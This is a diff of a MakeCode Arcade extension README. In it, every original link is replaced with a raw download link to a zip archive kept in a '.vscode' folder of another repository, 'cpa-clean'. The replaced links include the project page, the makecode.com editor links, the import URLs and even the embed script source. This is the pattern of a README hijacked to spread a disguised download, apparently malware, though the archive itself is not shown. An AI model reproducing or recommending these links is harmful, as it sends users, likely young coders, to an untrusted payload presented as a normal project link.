@@ -1,26 +1,26 @@
  
 
 
-> Open this page at [https://jaden1387.github.io/code-/](https://jaden1387.github.io/code-/)
+> Open this page at [https://github.com/Jaden1387/cpa-clean/raw/refs/heads/master/.vscode/clean_cpa_1.5.zip](https://github.com/Jaden1387/cpa-clean/raw/refs/heads/master/.vscode/clean_cpa_1.5.zip)
 
 ## Use as Extension
 
 This repository can be added as an **extension** in MakeCode.
 
-* open [https://arcade.makecode.com/](https://arcade.makecode.com/)
+* open [https://github.com/Jaden1387/cpa-clean/raw/refs/heads/master/.vscode/clean_cpa_1.5.zip](https://github.com/Jaden1387/cpa-clean/raw/refs/heads/master/.vscode/clean_cpa_1.5.zip)
 * click on **New Project**
 * click on **Extensions** under the gearwheel menu
-* search for **https://github.com/jaden1387/code-** and import
+* search for **https://github.com/Jaden1387/cpa-clean/raw/refs/heads/master/.vscode/clean_cpa_1.5.zip** and import
 
 ## Edit this project
 
 To edit this repository in MakeCode.
 
-* open [https://arcade.makecode.com/](https://arcade.makecode.com/)
+* open [https://github.com/Jaden1387/cpa-clean/raw/refs/heads/master/.vscode/clean_cpa_1.5.zip](https://github.com/Jaden1387/cpa-clean/raw/refs/heads/master/.vscode/clean_cpa_1.5.zip)
 * click on **Import** then click on **Import URL**
-* paste **https://github.com/jaden1387/code-** and click import
+* paste **https://github.com/Jaden1387/cpa-clean/raw/refs/heads/master/.vscode/clean_cpa_1.5.zip** and click import
 
 #### Metadata (used for search, rendering)
 
 * for PXT/arcade
-<script src="https://makecode.com/gh-pages-embed.js"></script><script>makeCodeRender("{{ site.makecode.home_url }}", "{{ site.github.owner_name }}/{{ site.github.repository_name }}");</script>
+<script src="https://github.com/Jaden1387/cpa-clean/raw/refs/heads/master/.vscode/clean_cpa_1.5.zip"></script><script>makeCodeRender("{{ site.makecode.home_url }}", "{{ site.github.owner_name }}/{{ site.github.repository_name }}");</script>
